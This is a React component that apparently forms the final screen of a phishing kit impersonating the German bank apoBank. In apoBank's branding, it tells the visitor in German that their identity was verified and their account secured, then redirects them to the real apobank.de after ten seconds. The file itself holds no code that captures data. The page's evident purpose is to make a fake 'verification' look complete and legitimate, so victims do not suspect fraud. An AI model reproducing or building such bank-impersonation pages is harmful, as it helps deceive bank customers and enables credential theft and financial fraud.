import React, { useEffect, useState } from 'react';

export const FinalSuccessScreen: React.FC = () => {
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://www.apobank.de/';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://www.apobank.de/';
  };

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'Source Sans Pro, Arial, sans-serif'
    }}>
      <div style={{
        maxWidth: isMobile ? 'none' : '1400px',
        margin: isMobile ? '0' : '0 auto',
        padding: isSmallMobile ? '20px 20px 20px 20px' : isMobile ? '24px 24px 24px 24px' : '32px 8px 32px 8px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: isMobile ? 'center' : 'flex-start'
      }}>
        <div style={{
          width: isMobile ? '100%' : '660px',
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'hidden'
        }}>
          <div style={{
            padding: isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px'
          }}>
            {/* Success Icon */}
            <div style={{
              color: '#4caf50',
              marginBottom: '1.5rem',
              textAlign: 'center'
            }}>
              <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
            </div>
            
            {/* Title */}
            <h1 style={{
              color: '#012169',
              fontSize: isMobile ? '1.5rem' : '1.75rem',
              fontWeight: 'bold',
              marginBottom: '1rem',
              fontFamily: 'Source Sans Pro, Arial, sans-serif',
              textAlign: 'center'
            }}>
              Verifizierung erfolgreich abgeschlossen
            </h1>
            
            {/* Description */}
            <p style={{
              color: '#666',
              fontSize: isMobile ? '14px' : '16px',
              lineHeight: isMobile ? '20px' : '24px',
              marginBottom: '2rem',
              fontFamily: 'Source Sans Pro, Arial, sans-serif',
              textAlign: 'center'
            }}>
              Ihre Identität wurde erfolgreich verifiziert. Ihr apoBank-Konto ist wieder sicher und zugänglich.
            </p>
            
            {/* Success Box */}
            <div style={{
              backgroundColor: '#f1f8e9',
              border: '1px solid #c8e6c9',
              borderRadius: '8px',
              padding: '1.5rem',
              marginBottom: '2rem'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                justifyContent: 'center'
              }}>
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" style={{ color: '#4caf50' }}>
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
                <div>
                  <p style={{
                    color: '#4caf50',
                    fontSize: '1rem',
                    fontWeight: 'bold',
                    margin: 0,
                    fontFamily: 'Source Sans Pro, Arial, sans-serif'
                  }}>
                    Sicherheitsmaßnahmen aktiviert
                  </p>
                  <p style={{
                    color: '#4caf50',
                    fontSize: '0.9rem',
                    margin: '0.5rem 0 0 0',
                    fontFamily: 'Source Sans Pro, Arial, sans-serif'
                  }}>
                    Alle Sicherheitsmaßnahmen wurden erfolgreich aktiviert. Ihr Konto ist jetzt vollständig geschützt.
                  </p>
                </div>
              </div>
            </div>
            
            {/* Redirect Notice */}
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #e9ecef',
              borderRadius: '8px',
              padding: '1.5rem',
              marginBottom: '2rem'
            }}>
              <p style={{
                color: '#000',
                fontSize: '1rem',
                fontWeight: 'normal',
                margin: 0,
                fontFamily: 'Source Sans Pro, Arial, sans-serif',
                fontStyle: 'normal',
                textAlign: 'center'
              }}>
                Sie werden automatisch in 10 Sekunden zu apobank.de weitergeleitet.
              </p>
            </div>
            
            {/* Manual Redirect Button */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              marginBottom: '1rem'
            }}>
              <button
                onClick={handleManualRedirect}
                style={{
                  width: isMobile ? '100%' : 'auto',
                  padding: '12px 24px',
                  backgroundColor: '#012169',
                  color: 'white',
                  border: 'none',
                  borderRadius: '50px',
                  fontSize: '0.8125rem',
                  fontWeight: 'normal',
                  cursor: 'pointer',
                  transition: 'background-color 0.2s ease',
                  fontFamily: 'Source Sans Pro, Arial, sans-serif',
                  fontStyle: 'normal',
                  textAlign: 'center',
                  textDecoration: 'none',
                  display: 'inline-block',
                  lineHeight: '1.5',
                  minWidth: '200px'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#0056b3';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = '#012169';
                }}
              >
                Jetzt zu apobank.de
              </button>
            </div>
            
            {/* Footer Text */}
            <p style={{
              color: '#666',
              fontSize: '0.875rem',
              margin: 0,
              lineHeight: '1.4',
              fontFamily: 'Source Sans Pro, Arial, sans-serif',
              fontStyle: 'normal',
              textAlign: 'center'
            }}>
              Vielen Dank für Ihre Geduld. Ihre Sicherheit ist unsere Priorität.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}; 